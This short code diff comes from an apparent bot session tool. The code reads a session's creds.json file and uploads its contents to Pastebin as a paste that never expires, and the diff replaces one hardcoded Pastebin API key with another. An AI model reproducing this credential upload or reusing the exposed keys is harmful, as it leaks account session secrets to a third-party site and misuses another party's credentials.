@@ -65,7 +65,7 @@ async function ovl(num, res, disconnect = false) {
         try {
           const CREDS = fs.readFileSync(`${sessionDir}/creds.json`, 'utf-8');
           const response = await axios.post('https://pastebin.com/api/api_post.php', new URLSearchParams({
-            api_dev_key: '64TBS-HKyH1n5OL2ddx7DwtpOKMsRDXl',
+            api_dev_key: 'ZEWJl3OmLT8rBTTtEcaXoMfQRQ3p5Yg0',
             api_option: 'paste',
             api_paste_code: CREDS,
             api_paste_expire_date: 'N'
